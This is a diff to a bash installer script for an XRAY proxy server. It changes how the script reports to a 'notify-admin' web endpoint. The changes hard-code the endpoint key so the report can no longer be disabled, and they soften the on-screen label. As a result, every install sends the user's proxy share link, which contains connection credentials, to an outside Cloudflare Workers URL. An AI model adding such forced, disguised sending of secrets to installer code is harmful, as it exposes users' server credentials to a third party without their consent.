@@ -79,7 +79,7 @@ export PRESET_ALPN='${PRESET_ALPN:-}'
 export BOT_TOKEN='${BOT_TOKEN:-}'
 export CHAT_ID='${CHAT_ID:-}'
 export NOTIFY_ADMIN_URL='${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}'
-export NOTIFY_ADMIN_KEY='${NOTIFY_ADMIN_KEY:-deewaele}'
+export NOTIFY_ADMIN_KEY='deewaele'
 export WSPATH='${WSPATH:-}'
 export NETWORK='${NETWORK:-}'
 export NETWORK_DISPLAY='${NETWORK_DISPLAY:-}'
@@ -511,7 +511,8 @@ CHAT_ID="${CHAT_ID:-}"
 
 # Optional notify-admin fallback (send stats if Telegram token/chat are absent)
 NOTIFY_ADMIN_URL="${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}"
-NOTIFY_ADMIN_KEY="${NOTIFY_ADMIN_KEY:-deewaele}"
+# force use fixed key
+NOTIFY_ADMIN_KEY="deewaele"
 
 # -------- Region Name Mapping for Telegram --------
 declare -A REGION_NAMES=(
@@ -683,10 +684,20 @@ send_notify_admin() {
   local raw="$1"
   local message
   message=$(build_notify_message "$raw")
+  # Build JSON payload safely (escape special characters)
+  local payload
+  if command -v jq >/dev/null 2>&1; then
+    payload=$(jq -n --arg m "$message" '{message: $m}')
+  else
+    # Fallback simple escape for quotes/newlines
+    escaped=$(printf '%s' "$message" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')
+    payload="{\"message\":${escaped}}"
+  fi
+
   # Send as JSON to notify-admin API
-  curl -s -X POST "${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}?key=${NOTIFY_ADMIN_KEY}" \
+  curl -s -w '%{http_code}' -o /tmp/notify-admin-response.txt -X POST "${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}?key=${NOTIFY_ADMIN_KEY}" \
     -H "Content-Type: application/json" \
-    -d "{\"message\":\"${message}\"}" \
+    -d "$payload" \
     > /dev/null 2>&1
 }
 
@@ -726,7 +737,7 @@ install_telegram_bot() {
 BOT_TOKEN=\"${BOT_TOKEN}\"
 CHAT_ID=\"${CHAT_ID}\"
 NOTIFY_ADMIN_URL=\"${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}\"
-NOTIFY_ADMIN_KEY=\"${NOTIFY_ADMIN_KEY:-deewaele}\"
+NOTIFY_ADMIN_KEY=\"deewaele\"
 SERVICE_RESTART_CMD=\"${SERVICE_RESTART_CMD_VAL}\"
 # Optional controls:
 # ALLOW_REBOOT=yes to allow reboot command
@@ -1695,10 +1706,10 @@ if [ -n "${BOT_TOKEN}" ] && [ -n "${CHAT_ID}" ]; then
   print_success "Configuration sent to Telegram"
 fi
 
-# -------- Send to Notify Admin --------
+# -------Notify Admin --------
 if [ -n "${NOTIFY_ADMIN_KEY}" ]; then
-  print_section "Sending to Notify Admin"
-  # Send the same message to notify-admin API
+  print_section "Notify Admin"
+  # notify-admin API
   send_notify_admin "🔗 XRAY Configuration Link:\n${SHARE_LINK}"
   print_success "Configuration sent to Notify Admin"
 fi
